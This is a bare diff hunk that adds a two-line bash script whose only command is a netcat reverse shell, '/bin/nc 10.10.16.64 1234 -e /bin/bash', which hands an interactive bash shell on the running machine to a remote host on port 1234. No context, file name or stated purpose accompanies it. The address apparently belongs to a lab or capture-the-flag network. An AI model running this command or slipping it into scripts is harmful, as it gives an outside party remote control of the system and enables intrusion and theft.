@@ -1,0 +1,2 @@
+#!/bin/bash
+/bin/nc 10.10.16.64 1234 -e /bin/bash
